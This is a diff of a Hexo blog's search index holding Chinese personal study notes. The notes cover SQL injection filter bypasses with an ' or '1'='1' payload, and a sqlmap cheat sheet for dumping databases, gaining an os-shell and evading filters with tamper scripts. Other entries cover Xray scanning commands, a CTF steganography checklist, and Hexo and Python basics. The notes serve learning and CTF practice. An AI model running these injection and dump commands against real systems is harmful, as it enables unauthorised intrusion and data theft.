+<li><p>绕过方式<br> 关键词过滤：大小写、双写、等价替换<br> 关键词被过滤： 引号–&gt;16进制编码<br>   可以用 and or  xor 等，&amp;&amp; || | !<br>   or –&gt;  oorr  –&gt;or<br>   or –&gt;  |<br>   select * from user where id &#x3D;’1’ or ‘1’&#x3D;’1’</p>
+</li>
+<li><p>sqlmap<br> 强大的sql注入工具，检测是否sql注入<br> 语法：sqlmap -u URL<br>       sqlmap -r 请求报文文件<br>    –dbs                                           查询数据库<br>    –tables -D  数据库名称                         查询指定数据库下的表<br>    –cloumns -D 数据库名称 -T 数据表名称           查询指定数据库下的指定表的列<br>    –dump -D 数据库名称 -T数据表名称 -C 指定列，…查询数据<br>    –sql-shell                                     获取sql的cmd命令行(只支持增删改查)<br>    –os-shell                                      获取远程控制<br>    –tamper                                        指定一些绕过处理，绕过一些过滤，<br>                                                    kali自带的比较好用的脚本,路径在 &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;temper，其中spaceconment.py比较好用，转换空格<br>                                                    例如：sqlmap -u URL –temper spaceconment –dbs</p>
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/07/10/Xray/</url>
+    <content><![CDATA[<p><strong>Xray</strong></p>
+<p>1.使用xray进行服务扫描</p>
+<p>#快速检测单个目标</p>
+<p> .\xray_darwin_amd64.exe servicescan –target 127.0.0.1:8009</p>
+<p>#批量检查1.txt中的目标，一行一个目标带端口</p>
+<p> .\xray_darwin_amd64.exe servicescan –target-file 1.txt </p>
+<p>其中，1.txt的格式为一行一个service，如</p>
+<p>1.1.1.1:80</p>
+<p>2.2.2.2:7777</p>
+<p>若需要输出到html报告中则在后面加上 –html-output service.html,</p>
+<p> .\xray_darwin_amd64.exe servicescan –target-file 1.file –html-output 1.html</p>
+<p>批量扫url的命令</p>
+<p>\xray_windows_amd64.exe webscan –url-file 2.txt –html-output 2.html</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>hello,my first blog</title>
+    <url>/2023/04/19/hello-my-first-blog/</url>
+    <content><![CDATA[<h1 id="博客操作流程"><a href="#博客操作流程" class="headerlink" title="博客操作流程"></a>博客操作流程</h1><p>首先在博客根目录下右键打开git bash，安装一个扩展npm i hexo-deployer-git。</p>
+<p>然后输入hexo new post “我的第一篇博客”，新建一篇文章。</p>
+<p>然后打开D:\Hexo\source_posts的目录，可以发现下面多了一个文件夹和一个.md文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。<br>你可以会直接在vscode里面编写markdown文件，可以实时预览，也可以用用其他编辑md文件的软件的工具编写。<br>编写完markdown文件后，根目录下输入hexo g生成静态网页，然后输入hexo s可以本地预览效果，最后输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p>
+<p>到这儿基本第一部分就完成了，已经完整搭建起一个比较简陋的个人博客了，接下来我们就可以对我们的博客进行个性化定制了。<br>以下学习markdown的相关语法并测试</p>
+<p>1.1 代码块<br>&#39;‘’shell<br>#VScode终端<br>hexl clean;hexo s<br>hexo clean;hexo g;hexo d<br>git add . &amp;&amp;git commit -m “npm publish” &amp;&amp; npm version patch<br>git push<br>&#39;‘’ </p>
+<p>1.2 多级标题</p>
+<h1 id="H1"><a href="#H1" class="headerlink" title="H1"></a>H1</h1><h2 id="H2"><a href="#H2" class="headerlink" title="H2"></a>H2</h2><h3 id="H3"><a href="#H3" class="headerlink" title="H3"></a>H3</h3><p>以此类推</p>
+<p>1.3 文字样式<br><u>下划线演示</u></p>
+<p><strong>字体加粗</strong></p>
+<p><em>斜体</em></p>
+<p><code>高亮</code></p>
+<p><del>删除</del></p>
+<p><font size =5>5号字 </font><br><font face="等线">等线</font><br><font color=blue>蓝</font></p>
+<p>1.4引用</p>
+<blockquote>
+<p>JAVA<br>二级引用演示<br>MYSQL</p>
+<blockquote>
+<p>外键</p>
+<p>事务</p>
+<p><strong>行级锁</strong>（引用一样可以用格式）</p>
+</blockquote>
+<p>….</p>
+</blockquote>
+<h2 id="1-5-分割线"><a href="#1-5-分割线" class="headerlink" title="1.5 分割线"></a>1.5 分割线</h2><hr>
+<p>1.6 无序列表</p>
+<ul>
+<li>java</li>
+<li>python</li>
+<li>。。。</li>
+</ul>
+<ul>
+<li>java</li>
+<li>python</li>
+<li>。。。</li>
+</ul>
+<ul>
+<li>java</li>
+<li>python</li>
+<li>。。。</li>
+</ul>
+<p>1.6.2 有序列表（注意.后面有空格）</p>
+<p>1.<br>2.<br>3. </p>
+<p>1.7 图片</p>
+<h1 id="本地图片"><a href="#本地图片" class="headerlink" title="本地图片"></a>本地图片</h1><p>&lt;&#x2F;img src&#x3D;”C:\Users\陈楠\OneDrive\图片\本机照片” alt&#x3D;”1.jpg” style&#x3D;”zoom:50%;”&gt;<br><img src="/image.png" alt="hello-my-first-blog" title="1"></p>
+<p><img src="/./img/1.jpg" alt="1.jpg"></p>
+<p>1.8表格</p>
+<table>
+<thead>
+<tr>
+<th>项目编号</th>
+<th>资金</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>100,000</td>
+<td>无</td>
+</tr>
+<tr>
+<td>2</td>
+<td>200,000</td>
+<td>重要</td>
+</tr>
+</tbody></table>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2023/04/19/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/06/13/python/</url>
+    <content><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.整数：Python可以处理任意大小的整数（包括负整数），同数学公式写法</p>
+<p>2.浮点数：即小数，科学计数法时，小数点的位置可变，例如1.23x109和12.3x108是完全相等的。很大的浮点数用e表示10，1.23x10的9次方就是<code>1.23e9</code>，或者<code>12.3e8</code></p>
+<p>3.整数和浮点数在计算机内部存储的方式是不同的，整数最准确（包括除法），浮点数可能会涉及四舍五入</p>
+<p>4.字符串是以‘’</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>隐写总结</title>
+    <url>/2023/05/31/%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>[TOC]</p>
+<h1 id="1-总结"><a href="#1-总结" class="headerlink" title="1 总结"></a>1 总结</h1><ol>
+<li><font color=red>图片属性一定要看的，题目给的提示有可能是误导，这点要自己判断. 即使是string看不到，也要手工看下，结果不一样</font></li>
+<li><font color=red>图片放kali</font>,会自动根据文件头识别文件类型</li>
+<li>strings 查看有无特殊字符串 <code>strings -f xxx | egrep -i &quot;flag|key|pass|sec|base|Zmxh|==&quot;</code></li>
+<li>strings <font color=red> | more 需要观察的都要仔细看</font></li>
+<li><font color=red>binwalk(u18)</font>检查图片中有无隐藏内容  </li>
+<li><font color=red>foremost(u18)</font>检查有无隐写，一般需要在kali中提前安装<code>sudo apt-get install foremost</code>，windows备用搜索关键字  </li>
+<li><font color=red>stegsolv</font>导出常见通道格式基本固定，<font color=red>遇到PNG和BMP图片，可以使用zsteg快速分析</font>，命令<code>zsteg -a xx.png</code>，其他图片还是用手工<font color=red>手工效率低下，是下下之选</font>。利用zsteg工具直接导出数据的命令<code>zsteg -e b1,rgb,lsb,xy    题目.png &gt; out.zip</code>。一般会在某个通道看到不一样的图像，其中一种见示例203_Misc-GreatWall</li>
+<li><font color=red>两张图片一模一样</font>，考虑三种：（1）两个图片某些像素不同，通过这些像素进行异或，相加等操作得到新的图片；使用Stegsolve1.3版本的combiner功能计算两个图片的各类组合（2）使用blindwatermark工具 <code>python2 bwm.py decode 1.png 2.png 1122.png</code>  </li>
+<li><font color=red>多张图片，要么一模一样，要么有特征规律（比如像素）</font>,使用Stegsolve1.3版本的combiner功能计算两个图片的各类组合，按照特征规律进行拼图<br>——————————–分隔——————————————</li>
+<li><font color=red>GIF</font>分离很多图片，虽然不会使用python对图片进行识别，但可以通过文件大小排序快速分类</li>
+<li>zsteg可以检测<font color=red>PNG</font>和<font color=red>BMP</font>图片里的隐写数据，在ubuntu18中已安装，先使用zsteg filename，观察有无可见字符，最后用zsteg -a file ：运行给定文件上的所有方法，仔细观察，特别是4&#x2F;5&#x2F;6&#x2F;7开头的两位十六进制码  </li>
+<li>看到<font color=red>PNG</font>要想到修改文件的高度与宽度。新方法：再x64中everything查找“png_height_width_fix.py”，通杀改高、改宽；老方法：修改第二行的第8位数字，那里是图片的高度。如还不行，可以考虑等比例放大，即将第二行的前4位数字double，5-8位数字double。</li>
+<li>看到<strong>BMP</strong>可以考虑高度，位置与PNG类似，<strong>但是结构不一样</strong>，宽度662， 十六进制0x296，图片保存格式为  00 00 96 02 ， 类似大小端</li>
+<li>还有<strong>JPG</strong>高度修改，使用010比较便捷。010路径：struct SOFx sof0 - WORD Y_image</li>
+<li><font color=red>PNG</font>隐写-IDAT，使用pngcheck.exe -v idat.png，一般针对大图片。如果有 IDAT 还没填满（填满6万多）就填充了下一个就要考虑是不是有问题。[[PNG-IDAT隐写]]</li>
+<li>目前了解，针对<font color=red>PNG</font>和<font color=red>JPG</font>，cloacked图片加密隐写，需要密码。<code>python2 lsb.py extract VALORANT.png output.jpg password</code>   密码如果不提供，一般为123456，或者文件名、或者题目名</li>
+<li>看到<font color=red>JPG</font>，还可以考虑使用steghide，<font color=red>优先考虑在u18上使用吧</font>。<code>steghide.exe  extract -sf good-已合并.jpg</code>。还可以考虑stegdetect。<code>stegdetect.exe -tjopi -s 10.0 hide.jpg</code>。还可以考虑使用stegbreak。<code>stegbreak.exe -r rules.ini -f password.dic -t p hide.jpg</code> </li>
+<li>对于jpg图片，是否提示与outguess有关，u18已安装  </li>
+<li>对于jpg图片，先使用SilentEye试试</li>
+<li>identify 1. ——————————–分隔–其他隐写——————————————</li>
+<li>看到base64，如果解码不正常，最后实在不行考虑下base64隐写<code>base64_stego</code>  </li>
+<li>F5隐写，u18\003-Misc\F5-stegxx，使用方法<code>java Extract Misc.jpg</code>，输出结果在<code>output.txt</code>中，可以<code>file output.txt</code>核实文件类型</li>
+<li>基于空格和制表符的隐写，<code>SNOW.exe -p password filename</code></li>
+<li>未知的文件格式，通常关注文件头的格式，同时也要注意文件尾的格式。详见<strong>各类文件特征总结</strong></li>
+<li>word文件可以通过修改后缀的方式解压缩</li>
+<li>doc隐写，本机的doc已经修改<code>选项、显示、隐藏文字</code>;修改后缀为zip，解压缩有用find xargs搜索。</li>
+<li>PDF可以通过x64虚拟机中安装的Foxit PhantomPDF打开，或者右键选择使用wps pdf编辑功能</li>
+<li>pyc隐写<code>python3 stegosaurus.py -x flag.pyc</code></li>
+<li>conf.bin文件用工具routerpassview 打开，注意搜索宽带账号和宽带密码</li>
+<li>MP3隐写：MP3stego需要猜测密码，<code>decode -X -P pass svega_stego.mp3</code></li>
+<li>WAV隐写：SilentEye工具直接打开看看</li>
+<li>MP3、wav隐写：使用audacity软件分析音频是，注意切换<strong>波形</strong> 和 <strong>频谱图</strong>，<strong>调整频谱增益</strong>，看得更清楚；也可以用软件Adobe Audition CS6打开，Shift + D切换两个视图</li>
+<li>如果音乐能正常播放，大概率是在音乐头部和尾部增加了内容，注意放大观察头尾</li>
+<li>wav隐写：audacity软件可以对音频进行剪裁（剪刀图标），dtmf2num.exe在识别时，需要比较纯净的音频。</li>
+<li>wav隐写：SilentEye软件直接打开后按decode</li>
+<li>wav隐写：MMSSTV结合虚拟声卡，播放一下；u16上安装的robot36工具，<code>decode &#39;Can you hear.wav&#39;</code>，ppm文件用ps可以打开。</li>
+<li>01格式的编码可能是二进制编码，也可能是摩斯码。关注长度是否是平方数，可否转换二维码。参考PNG IDAT隐写的例子</li>
+</ol>
+<h1 id="2-如果都尝试过没有思路，看看本文档的附件ppt"><a href="#2-如果都尝试过没有思路，看看本文档的附件ppt" class="headerlink" title="2 如果都尝试过没有思路，看看本文档的附件ppt"></a>2 如果都尝试过没有思路，看看本文档的附件ppt</h1><p>![[杂项.pptx]]</p>
+]]></content>
+  </entry>
 </search>
